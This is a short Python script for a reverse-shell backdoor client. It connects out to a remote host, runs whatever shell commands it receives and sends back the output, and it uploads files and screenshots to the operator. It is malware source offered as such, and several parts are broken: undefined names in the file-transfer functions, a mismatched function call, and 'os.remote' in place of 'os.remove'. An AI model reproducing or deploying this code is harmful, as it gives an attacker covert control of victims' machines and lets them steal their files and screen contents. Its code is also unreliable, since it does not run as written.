import socket
import subprocess
import os
from PIL import ImageGrab


def download_file():
    f = open(file, 'wb')
    client.settimeout(3)
    chunk = soc.recv(1024)
    while chunk:
        try:
            chunk = soc.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()


def upload_file():
    f = open(file, 'rb')
    client.send(f.read())


def screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.png')
    screenshot.close()


remote_host = '127.0.0.1'
port = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remote_host, port))

while True:
    comm = client.recv(1024).decode()
    if not comm:
        break
    elif comm [:6] == 'upload':
        upload_file()
    elif comm [:9]  == 'downloads':
        download_file()
    elif comm [:10] == 'screenshot':
        screenshot()
        upload_file('screenshot.png')
        os.remote('screenshot.png')
    else:
        try:
            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
            client.send(output.encode())
        except subprocess.CalledProcessError as e:
            msg = f'erro: {e}'
            client.send(msg.encode())

client.close()     
